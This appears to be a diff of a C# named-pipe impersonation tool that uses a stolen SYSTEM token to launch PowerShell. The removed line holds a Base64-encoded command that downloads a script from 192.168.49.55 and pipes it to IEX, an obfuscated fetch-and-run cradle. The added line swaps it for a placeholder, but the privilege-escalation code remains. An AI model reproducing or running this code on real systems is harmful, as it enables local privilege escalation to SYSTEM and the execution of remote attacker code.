@@ -144,7 +144,7 @@ namespace PipeImpersonate
             Console.WriteLine("Impersonated user is: " + name); 
             RevertToSelf();
 
-            CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUANQAvAGQAbwB3AG4AbABvAGEAZABfAGMAcgBhAGQAbABlAC4AcABzADEAJwApACAAfAAgAEkARQBYAA==", (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
+            CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc <command>", (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
         }
     }
 }
